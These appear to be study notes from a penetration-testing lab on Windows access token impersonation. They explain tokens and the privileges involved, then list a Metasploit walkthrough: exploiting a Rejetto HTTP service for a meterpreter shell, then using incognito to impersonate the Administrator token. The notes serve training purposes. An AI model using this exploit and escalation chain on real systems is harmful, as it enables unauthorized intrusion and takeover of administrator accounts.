Access Token Impersonation
#### Windows access token
- windows access tokens are a core element of the authentication process on windows and  are created and managed by the local Security Authority Subsystem service [LSASS]
- A windows access token is responsible for identifying and describing the security context of a process or thread running on a system.simple put,an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resources is accessed.
- Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identify and privileges fo the user account assicated with the thread or process.This token is then attached to the userinit.exe process,after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.
#### Windows Privileges
- The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been explited to gain initial access as well as the impersonation or delegation tokens available.
- The following are the privileges that are required for a successful impersonation attack.
- - SeAssignPrimary Token: This allows a user to impersonate tokens
- - SeCreateToken: This allows a user to create an arbitrary token with administrative privileges.
- - SelmpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.
#### The Incognito Module
- Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation.
- We can use the incognito module to display a list of available tokens that we can impersonate.

### Exploit
##### Initial access
- nmap 10.2.24.20 [ this show all the services]
- browse the http service and find service [ rejetto]
- service postgresql start
- msfconsole
- search rejetto
- use 0
- show options and set everything requires
- run
- this will give us meterpreter shell
#### privilege escalation
In meterpreter session
- sysinfo [ basic info about system ]
- pgrep explorer
- migrate 3512 [ here 3512 is a process ID of explorer ]
- getprivs [ this will list all the privileges of current user,here we find SeImpersonatePrivilege]
- load incognito [ this will load the incognito module,this will fail bcz we migrate our session] 
- run [ this will again run the exploit for initial access ]
- laod incognito
- list_tokens -u [ this will list all the user token ]
- impersonate_token "ATTACKDEFENSE\Administrator" [ here ATTACKDEFENSE\Administrator found from the previous command ]
- getprivs [ to get list of privileges and it will fail to list,so we need to migrate ]
- pgrep explorer [ for showing explorer process id ]
- migrate 2512 [ 2512 is process id ]
- getprivs [ now this will make list all the privileges ]
- getuid [ this will show user id ]

